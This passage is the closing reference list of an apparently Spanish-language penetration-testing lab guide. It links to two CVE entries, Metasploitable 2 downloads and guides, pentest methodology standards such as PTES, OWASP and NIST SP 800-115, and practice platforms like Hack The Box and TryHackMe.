- [CVE-2007-2447](https://nvd.nist.gov/vuln/detail/CVE-2007-2447) — Samba Username Map Script
- [CVE-2010-2075](https://nvd.nist.gov/vuln/detail/CVE-2010-2075) — UnrealIRCd 3.2.8.1 Backdoor

### Metasploitable 2
- [Metasploitable 2 Download (SourceForge)](https://sourceforge.net/projects/metasploitable/)
- [Metasploitable 2 Exploitability Guide — Rapid7](https://community.rapid7.com/docs/DOC-1875)
- [VulnHub — Metasploitable 2 Walkthrough Reference](https://www.vulnhub.com/entry/metasploitable-2,29/)

### Metodologías de Pentest
- [PTES — Penetration Testing Execution Standard](http://www.pentest-standard.org/)
- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [NIST SP 800-115 — Technical Guide to Information Security Testing](https://csrc.nist.gov/publications/detail/sp/800-115/final)

### Recursos de Aprendizaje Adicional
- [Hack The Box](https://www.hackthebox.com/) — Plataforma de práctica
- [TryHackMe — Metasploit Room](https://tryhackme.com/room/metasploitintro)
- [OffSec PEN-103 (Kali Linux Revealed)](https://www.kali.org/docs/)
